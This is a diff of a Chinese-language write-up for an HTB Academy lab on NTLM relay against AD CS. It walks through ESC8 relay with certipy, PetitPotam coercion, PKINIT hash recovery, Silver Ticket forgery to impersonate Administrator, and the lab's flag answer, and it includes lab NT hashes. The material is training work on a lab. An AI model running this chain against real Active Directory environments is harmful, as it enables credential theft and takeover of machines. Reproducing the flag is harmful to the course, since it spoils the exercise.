@@ -1,109 +1,153 @@
-# Writeup：Advanced NTLM Relay Attacks Targeting AD CS（ESC8 relay to Web Enrollment）
+# Advanced NTLM Relay Attacks Targeting AD CS
 
-**Module 情境**：HTB Academy *NTLM Relay Attacks* 課程 → Advanced NTLM Relay Attacks Targeting AD CS 小節
-**目標**：濫用 ESC8（或 ESC11）取得 WS01（172.16.117.50）的控制權，讀取 `C:\Users\Administrator\Desktop\flag.txt`
-**攻擊機**：10.129.205.223（ens192: 172.16.117.30）
-**認證**：`localws01` / NT hash `e4737f338324305993ed52f775a6d54d`
+**Module**：HTB Academy — *NTLM Relay Attacks* → Advanced NTLM Relay Attacks Targeting AD CS
 
----
+**環境**（同 Kerberos 小節）
 
-## 1. 確認 AD CS Web Enrollment 存在（ESC8 的前提）
+| 角色 | 主機 | IP |
+|---|---|---|
+| 攻擊跳板（Linux） | — | SSH `10.129.45.81`，內網 `172.16.117.30` |
+| DC + ADCS CA | DC01 | `172.16.117.3` |
+| 目標工作站 | WS01 | `172.16.117.50` |
 
-```bash
-curl -s -o /dev/null -w '%{http_code}\n' http://172.16.117.3/certsrv/
-curl -s -o /dev/null -w '%{http_code}\n' http://172.16.117.3/certsrv/certfnsh.asp
-nmap -p80,443 172.16.117.3 -oG - 2>/dev/null | grep -i open
-```
-
-```
-401
-401
-Host: 172.16.117.3 (dc01)  Ports: 80/open/tcp//http///, 443/closed/tcp//https///
-```
-
-`/certsrv/` 回 401（需要認證但服務存在）、443 關閉（只有 HTTP，沒有 HTTPS/EPA）—— 這正是 **ESC8**（AD CS Web Enrollment over HTTP，沒有 Extended Protection for Authentication）的經典前提條件，比 ESC11（走 RPC/ICPR）更直接。
+**網域**：`inlanefreight.local`　**低權限帳號**：`inlanefreight\rons` / NT hash `914b011029e6b43cf188d435951831bd`
 
 ---
 
-## 2. 確認 `localws01` 不是 WS01 的本機系統管理員
+## Q1：用 ESC8 / ESC11 拿下 WS01，讀 Administrator flag
 
-在開始找「如何升級」之前，先確認「現在到底有沒有權限」，避免白工：
-
-```bash
-cme smb 172.16.117.50 -u localws01 -H e4737f338324305993ed52f775a6d54d --local-auth --shares
-```
-
-```
-SMB  172.16.117.50  445  WS01  [+] WS01\localws01:e4737f338324305993ed52f775a6d54d
-SMB  172.16.117.50  445  WS01  Finance  READ
-SMB  172.16.117.50  445  WS01  IPC$     READ
-```
-
-`cme --shares` 用 `NetShareEnum` 列舉，連 `ADMIN$`/`C$` 都沒列出來（代表這個帳號對它們沒有連線權限，不是單純「列不到名字」），實測也證實：
+### 1. 列舉 CA 與弱點
 
 ```bash
-smbclient.py -hashes :e4737f338324305993ed52f775a6d54d localws01@172.16.117.50 -no-pass
-# use C$ → STATUS_ACCESS_DENIED
+certipy find -u rons@inlanefreight.local -hashes :914b011029e6b43cf188d435951831bd \
+  -dc-ip 172.16.117.3 -stdout -vulnerable
 ```
 
-**結論**：`localws01` 只是個普通本機帳號，不是本機管理員，直接讀 `C:\Users\Administrator\Desktop\flag.txt` 不可行 —— 必須透過 ESC8 relay 拿到一張能代表更高權限身份的憑證才能繼續，這也說明了這一節存在的意義。
+重點輸出：
+
+```
+Certificate Authorities
+  CA Name            : INLANEFREIGHT-DC01-CA
+  DNS Name           : DC01.INLANEFREIGHT.LOCAL
+  Web Enrollment     : Enabled
+  Request Disposition: Issue
+  Enforce Encryption for Requests : Disabled
+  [!] Vulnerabilities
+    ESC8  : Web Enrollment is enabled and Request Disposition is set to Issue
+    ESC11 : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+```
+
+CA 同時中 **ESC8（HTTP Web Enrollment relay）** 與 **ESC11（ICPR/RPC relay）**。本題走 **ESC8**。
+
+**思路**：coerce WS01 → 它用 `WS01$` 對我們做 SMB 認證 → `certipy relay` 把這個認證 relay 到 CA 的 web enrollment（`http://dc01/certsrv`），用 `Machine` 範本幫 `WS01$` 申請一張憑證 → 用該憑證 PKINIT 拿 `WS01$` 的 TGT 與 NT hash → 以 `WS01$` 身分在 WS01 本機冒充 Administrator → 讀 flag。
+
+> SMB→HTTP 是跨協定 relay：被 coerce 的機器送 SMB 認證，relay 到 HTTP target（web enrollment）不受 SMB 簽章限制，所以**這裡不需要 WebDAV**，PetitPotam 用裸 IP 的 SMB listener 即可。
+
+### 2. 起 ESC8 relay
+
+```bash
+sudo tmux new-session -d -s esc8 \
+ "stdbuf -oL -eL certipy relay -target http://172.16.117.3 -template Machine > /tmp/esc8.log 2>&1"
+# [*] Targeting http://172.16.117.3/certsrv/certfnsh.asp (ESC8)
+# [*] Listening on 0.0.0.0:445
+```
+
+> `certipy relay` 自己起 SMB(445) listener；`-template Machine` 因為被 relay 的是機器帳號（`$` 結尾）。起之前先把 Kerberos 小節殘留的 `ntlmrelayx`/`Responder` 全部 `pkill` 掉，確保 445 空著。
+
+### 3. coerce WS01（PetitPotam，SMB）
+
+```bash
+python3 ~/tools/PetitPotam/PetitPotam.py -d inlanefreight.local -u rons \
+  -hashes :914b011029e6b43cf188d435951831bd 172.16.117.30 172.16.117.50
+# [+] Attack worked!
+```
+
+esc8 log：
+
+```
+INLANEFREIGHT\WS01$
+[*] Requesting certificate for 'INLANEFREIGHT\WS01$' based on the template 'Machine'
+[-] Got error: timed out          # 前幾次逾時，WS01 會重試
+...
+[*] Got certificate with DNS Host Name 'WS01.INLANEFREIGHT.LOCAL'
+[*] Saved certificate and private key to 'ws01.pfx'
+```
+
+> 前幾次 `timed out` 是正常的，WS01 的 coerce 會連續重試幾次，最後成功拿到 `ws01.pfx`。
+
+### 4. 憑證 → WS01$ 的 TGT 與 NT hash
+
+```bash
+cd /tmp && certipy auth -pfx /tmp/ws01.pfx -dc-ip 172.16.117.3
+# [*] Using principal: ws01$@inlanefreight.local
+# [*] Got TGT  -> ws01.ccache
+# [*] Got hash for 'ws01$@inlanefreight.local':
+#     aad3b435b51404eeaad3b435b51404ee:d172f136edc2366d2aa411e92ab6ca01
+```
+
+### 5. WS01$ → 本機 Administrator —— **S4U2self 失敗，改用 Silver Ticket**
+
+直覺想用 `getST` 的 S4U（S4U2self + S4U2proxy）冒充 Administrator：
+
+```bash
+getST.py -spn cifs/ws01.inlanefreight.local -impersonate Administrator \
+  -hashes :d172f136edc2366d2aa411e92ab6ca01 inlanefreight.local/WS01$ -dc-ip 172.16.117.3
+# [-] KDC_ERR_BADOPTION: Probably SPN is not allowed to delegate by user WS01$ ...
+```
+
+**根因**：這版 impacket 的 `getST.py` 沒有 `-self` 旗標，給 `-impersonate` 時一定會接著做 S4U2proxy；而 `WS01$` 沒有對自己的委派權限，S4U2proxy 必然 `KDC_ERR_BADOPTION`。
+
+**解法**：既然已經有 `WS01$` 的 NT hash，直接**偽造 Silver Ticket**（用機器帳號 hash 離線簽一張 `cifs/ws01` 的 TGS，冒充任意使用者，完全不碰 KDC）。需要 Domain SID：
+
+```bash
+lookupsid.py -hashes :914b011029e6b43cf188d435951831bd \
+  inlanefreight.local/rons@172.16.117.3 0 | grep -i 'Domain SID'
+# Domain SID is: S-1-5-21-1207890233-375443991-2397730614
+
+cd /tmp
+ticketer.py -nthash d172f136edc2366d2aa411e92ab6ca01 \
+  -domain-sid S-1-5-21-1207890233-375443991-2397730614 \
+  -domain inlanefreight.local \
+  -spn cifs/ws01.inlanefreight.local Administrator
+# -> Administrator.ccache
+```
+
+### 6. 讀 flag
+
+```bash
+KRB5CCNAME=/tmp/Administrator.ccache smbclient.py -k -no-pass ws01.inlanefreight.local <<'EOF'
+use C$
+cd Users\Administrator\Desktop
+get flag.txt
+EOF
+```
+
+### ✅ Q1 Answer：`Abusing_ADCS_For_FUN`
 
 ---
 
-## 3. 架設 ESC8 Relay（ntlmrelayx → certsrv）
+## 備註：ESC11 的替代打法
 
-跟 Kerberos 那一節共用同一組 `tmux` 長駐技巧（見另一篇 writeup 裡記錄的 stdin/EOF 坑），這裡直接用正確做法：
-
-```bash
-tmux new-session -d -s adcs
-tmux send-keys -t adcs \
-  'sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp --adcs \
-   --no-smb-server --no-wcf-server --no-raw-server 2>&1 | tee /tmp/adcs_relay.log' Enter
-tmux send-keys -t adcs "$(cat ~/.pw)" Enter
-```
-
-`--adcs` 讓 `ntlmrelayx` 在拿到任何 relay 進來的認證後，自動對 `certsrv/certfnsh.asp` 送出憑證申請（依身份名稱是否以 `$` 結尾自動選 `Machine` 或 `User` 範本）。
-
----
-
-## 4. 嘗試主動 coerce WS01（遇到跟 Kerberos 那節一樣的環境限制）
-
-用 Coercer 對 WS01 跑了完整的 EFSR/MS-RPRN/MS-FSRVP 測試（各種 pipe、各種方法、`@80` WebDAV 格式），搭配 `tcpdump` 側錄做 ground truth：
+若 web enrollment 被關、只剩 ICPR(RPC)，同一條鏈改用 ESC11：
 
 ```bash
-sudo Coercer coerce -v -t 172.16.117.50 -u localws01 -d '.' \
-  --hashes :e4737f338324305993ed52f775a6d54d -l 172.16.117.30 \
-  --auth-type http --always-continue
+certipy relay -target rpc://172.16.117.3 -ca INLANEFREIGHT-DC01-CA -template Machine
 ```
 
-雖然輸出會印出一堆 `[+] (ERROR_BAD_NETPATH)`（綠色，Coercer 把這個狀態當成「成功」指標），但同步跑的 `tcpdump -i ens192 'tcp port 80' and host 172.16.117.50` 確認 **實際封包數是 0**。
+其餘（coerce → `certipy auth` → silver ticket）完全相同。
 
-這跟前一篇 Authentication Coercion 的發現一致：**`ERROR_BAD_NETPATH` 這個狀態只代表 RPC call 的回傳例外字串裡含有這個關鍵字，不代表攻擊機真的收到連線**（詳見 Coercer 原始碼 `network/authentications.py` 的判定邏輯）。本環境裡，主動用 RPC coercion（不管是 EFSR 的 `\PIPE\lsarpc`/`lsass`/`netlogon`/`samr`，還是 MS-RPRN 的 PrinterBug）都沒有真正讓 WS01 對外發起連線。
+## 小結
 
----
+| 步驟 | 工具 | 關鍵 |
+|---|---|---|
+| 找弱點 | `certipy find -vulnerable` | ESC8/ESC11，Web Enrollment=Enabled |
+| relay | `certipy relay -target http://dc` | SMB→HTTP 跨協定，不需 WebDAV |
+| coerce | `PetitPotam.py <我方IP> <WS01>` | 裸 IP + SMB 即可 |
+| 憑證換身分 | `certipy auth -pfx` | 得 TGT + NT hash |
+| 本機提權 | `ticketer.py`（Silver Ticket） | 繞過 S4U2self 缺旗標問題 |
 
-## 5. 目前狀態（誠實記錄）
-
-- AD CS Web Enrollment（ESC8 前提）已確認存在，`ntlmrelayx --adcs` 已正確架設並長駐在 tmux session `adcs` 裡等待連線。
-- 已證實 `localws01` 不是 WS01 本機管理員，**必須**透過 ESC8 relay 升級才能讀到 flag，不是「忘記試試看直接讀」。
-- 主動 coercion（Coercer 的 EFSR / MS-RPRN / MS-FSRVP 全部協定組合）在本環境對 WS01 一律無法產生真實的對外連線（`tcpdump` 側錄驗證）。
-- 與 Kerberos 模組共用的被動觸發點（`\\DC01\Testing` 上的 `.searchConnector-ms`，指向 `http://172.16.117.30/windows`）如果被 WS01 瀏覽到，會同時滿足這一節「取得 WS01 的 HTTP NTLM 認證」的需求 —— 目前持續等待該觸發，relay 才能進到「申請憑證 → `certipy auth` 換 NT hash / TGT → 存取 WS01」的後續步驟。
-- 因為 `localws01` 不是 WS01 admin，且 Coercer 主動觸發不可靠，**判斷本題的被動觸發來源機率較高是「WS01 自己瀏覽 `\\DC01\Testing`」**，而不是「有人瀏覽 WS01 上的 Finance 分享」；Finance 分享本身 `localws01` 也只有 READ，無法在上面放誘餈驗證這個假設。
-
----
-
-## 6. 後續步驟（relay 成功拿到憑證之後要做的事，先記錄下來）
-
-一旦 `ntlmrelayx --adcs` 真的 relay 到一筆認證並成功申請到憑證（log 會印出 `.pfx` 檔案路徑），後續流程：
+## 清理
 
 ```bash
-# 用拿到的憑證做 PKINIT，換出 NT hash（UnPAC-the-Hash）
-certipy auth -pfx <relayed-identity>.pfx -dc-ip 172.16.117.3
-
-# 如果relay 到的是 WS01$ 本身，拿到它的 NT hash 後可以：
-# 1) 直接 PtH 對 WS01 嘗試本機系統層級存取（機器帳號在本機 Session 0 等效 SYSTEM 的場景）
-# 2) 或用這張憑證／hash 進一步做 S4U2self 冒充 Administrator 存取 WS01 的服務
-wmiexec.py -hashes :<WS01$ NT hash> 'WS01$@172.16.117.50'
+sudo tmux kill-server; sudo pkill -f 'certipy|ntlmrelayx.py|Responder.py'
 ```
-
-這部分待實際拿到憑證後補上真實輸出。
